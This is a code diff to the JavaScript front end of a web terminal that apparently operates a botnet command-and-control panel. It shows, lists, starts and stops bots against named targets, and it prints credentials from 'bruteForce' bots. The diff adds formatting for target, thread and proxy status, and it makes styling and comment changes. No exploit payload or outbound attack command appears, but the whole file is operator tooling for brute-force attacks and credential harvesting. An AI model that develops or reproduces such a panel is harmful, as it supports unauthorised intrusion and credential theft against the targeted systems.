@@ -38,13 +38,13 @@ document.getElementById('userInput').addEventListener('keypress', async function
 
         let terminal = document.getElementById('terminal');
 
-        // Show user input
+        // Show user input – MODIFIED to use Tailwind classes
         let newLine = document.createElement('div');
-        newLine.classList.add('command-line');
-        newLine.innerHTML = `<span class="prompt">user@specter:~$</span> <span class="command-text">${escapeHtml(inputText)}</span>`;
+        newLine.classList.add('command-block');   // changed class name
+        newLine.innerHTML = `<span class="text-emerald-400 font-bold">user@specter:~$</span> <span class="text-emerald-400 break-all">${escapeHtml(inputText)}</span>`;
         terminal.insertBefore(newLine, this.parentElement);
 
-        // Placeholder for command output
+        // Placeholder for command output (unchanged)
         let outputLine = document.createElement('div');
         outputLine.classList.add('output-container');
         outputLine.innerHTML = `<div class="output-content"><span class="prompt"></span><pre><code class="output" style="white-space:pre;">Executing command...</code></pre></div>`;
@@ -87,7 +87,7 @@ document.getElementById('userInput').addEventListener('keypress', async function
     }
 });
 
-// Add arrow key navigation for command history
+// Add arrow key navigation for command history (unchanged)
 document.getElementById('userInput').addEventListener('keydown', function (event) {
     if (event.key === 'ArrowUp') {
         event.preventDefault();
@@ -98,7 +98,7 @@ document.getElementById('userInput').addEventListener('keydown', function (event
     }
 });
 
-// Command history navigation function
+// Command history navigation function (unchanged)
 function navigateHistory(direction) {
     if (commandHistory.length === 0) return;
 
@@ -142,6 +142,54 @@ function getCookie(name) {
     return null;
 }
 
+// Helper function to format the JSON response from bot start/stop commands
+function formatBotInfoResponse(data) {
+    if (!data || typeof data !== 'object') {
+        return String(data);
+    }
+    // If it's an array of target info objects
+    if (Array.isArray(data) && data.length > 0) {
+        let output = '';
+        for (let i = 0; i < data.length; i++) {
+            const item = data[i];
+            output += `====================== Target ${i+1} ======================\n`;
+            // target_data
+            if (item.target_data) {
+                output += `Target Data:\n`;
+                output += `  ID           : ${item.target_data.id || 'N/A'}\n`;
+                output += `  Target Name  : ${item.target_data.target_name || 'N/A'}\n`;
+                output += `  Is Registered: ${item.target_data.is_registor || 'N/A'}\n`;
+            }
+            // therade_permission
+            if (item.therade_permission) {
+                output += `Thread Permission:\n`;
+                output += `  ID             : ${item.therade_permission.id || 'N/A'}\n`;
+                output += `  Thread Permission: ${item.therade_permission.threadPermission || 'N/A'}\n`;
+            }
+            // thread_status
+            if (item.thread_status) {
+                output += `Thread Status:\n`;
+                output += `  Thread ID    : ${item.thread_status.thread_id || 'N/A'}\n`;
+                output += `  Type         : ${item.thread_status.type || 'N/A'}\n`;
+                output += `  Category     : ${item.thread_status.catgory || 'N/A'}\n`;
+                output += `  Status       : ${item.thread_status.threadStatus || 'N/A'}\n`;
+                output += `  Created At   : ${item.thread_status.created_at || 'N/A'}\n`;
+            }
+            // set_proxci
+            if (item.set_proxci) {
+                output += `Proxy Settings:\n`;
+                output += `  ID           : ${item.set_proxci.id || 'N/A'}\n`;
+                output += `  Proxy Status : ${item.set_proxci.proxci_status || 'N/A'}\n`;
+                output += `  Created At   : ${item.set_proxci.created_at || 'N/A'}\n`;
+            }
+            output += `==========================================================\n\n`;
+        }
+        return output;
+    }
+    // If it's a plain message
+    return String(data);
+}
+
 async function cmd(userInput) {
     const input = userInput.trim().split(' ').filter(Boolean);
     console.log('Parsed Input:', input);
@@ -165,59 +213,61 @@ Options:
         }
 
         if (input[1] === 'show') {
-try {
-    const targetId = url[url.length - 1];
-    if (!targetId || targetId === 'undefined') {
-        return 'Error: No valid target ID found in URL.';
-    }
+            try {
+                const targetId = url[url.length - 1];
+                if (!targetId || targetId === 'undefined') {
+                    return 'Error: No valid target ID found in URL.';
+                }
 
-    const data = await api(null, 'GET', `/api_command/botNet/${targetId}`);
-    if (!data) return 'Error: No response received from server.';
+                const data = await api(null, 'GET', `/api_command/botNet/${targetId}`);
+                if (!data) return 'Error: No response received from server.';
 
-    const botList = data.botNetInfo || data;
-    if (!Array.isArray(botList) || botList.length === 0) {
-        return 'No bot data available.';
-    }
+                const botList = data.botNetInfo || data;
+                if (!Array.isArray(botList) || botList.length === 0) {
+                    return 'No bot data available.';
+                }
 
-    let output = "======================Available Bots==========================\n\n";
+                let output = "======================Available Bots==========================\n\n";
 
-    botList.forEach((bot, i) => {
-        // handle array or object format
-        const b = Array.isArray(bot) ? bot : Object.values(bot);
+                botList.forEach((bot, i) => {
+                    const b = Array.isArray(bot) ? bot : Object.values(bot);
+                    const id = b[0] || 'N/A';
+                    const type = b[4] || 'unknown';
+                    const status = b[5] || 'unknown';
+                    const threads = b[7] || '0';
+                    const username = b[8] || '';
+                    const password = b[9] || '';
 
-        const id = b[0] || 'N/A';
-        const type = b[4] || 'unknown';
-        const status = b[5] || 'unknown';
-        const threads = b[7] || '0';
-        const username = b[8] || '';
-        const password = b[9] || '';
+                    output += `Bot #${i + 1}\n`;
+                    output += `ID       = ${id}\n`;
+                    output += `Type     = ${type}\n`;
+                    output += `Status   = ${status}\n`;
+                    output += `Threads  = ${threads}\n`;
 
-        output += `Bot #${i + 1}\n`;
-        output += `ID       = ${id}\n`;
-        output += `Type     = ${type}\n`;
-        output += `Status   = ${status}\n`;
-        output += `Threads  = ${threads}\n`;
+                    if (type === 'bruteForce') {
+                        output += `Username = ${username}\n`;
+                        output += `Password = ${password}\n`;
+                    }
 
-        if (type === 'bruteForce') {
-            output += `Username = ${username}\n`;
-            output += `Password = ${password}\n`;
-        }
+                    output += "--------------------------------------------------------------\n";
+                });
 
-        output += "--------------------------------------------------------------\n";
-    });
+                output += "==============================================================\n";
+                return output;
 
-    output += "==============================================================\n";
-    return output;
-
-} catch (error) {
-    console.error('Error fetching bot data:', error);
-    return `Failed to fetch bot data: ${error.message}`;
-}
+            } catch (error) {
+                console.error('Error fetching bot data:', error);
+                return `Failed to fetch bot data: ${error.message}`;
+            }
 
         } else if ((input[1] === 'start' || input[1] === 'stop') && (input[2] === '--id' || input[2] === '-i') && input[3]) {
             try {
                 const data = { input: userInput };
                 const response = await api(data, 'POST', `/api_command/${url[url.length - 1]}`);
+                // If response is an object with detailed info, format it; otherwise use simple message
+                if (response && typeof response === 'object' && !response.response && !response.message) {
+                    return formatBotInfoResponse(response);
+                }
                 const msg = response?.response || response?.message || 'Command executed successfully';
                 return msg;
             } catch (error) {
@@ -249,7 +299,8 @@ try {
     } else if (command === 'clear') {
         const terminal = document.getElementById('terminal');
         if (terminal) {
-            const lines = terminal.querySelectorAll('.command-line, .output-container');
+            // MODIFIED: also remove elements with class 'command-block' (the new command lines)
+            const lines = terminal.querySelectorAll('.command-block, .output-container');
             lines.forEach(line => {
                 if (!line.querySelector('input')) {
                     line.remove();
@@ -274,8 +325,7 @@ async function delete_cmd(ID,target_name){
 }
 
 
-// Function to handle API requests
-// This function can be used to send data to the server and receive a response.
+// Function to handle API requests (unchanged)
 async function api(data=NaN, method='GET', url = window.location.href, parm = '') {
     /*    * data: The data to be sent to the server (optional).
      *    * method: The HTTP method to use (e.g., 'GET', 'POST').
@@ -311,13 +361,7 @@ async function api(data=NaN, method='GET', url = window.location.href, parm = ''
         return null;
     }
 }
-// chake for update
-/*
-data recived from api_command_update
-{
-    "message": "update"
-}
-*/
+// chake for update (unchanged)
 setInterval(async () => {
     // Get the last part of the URL, safely encode it
     let target_name = window.location.href.split('/').pop();
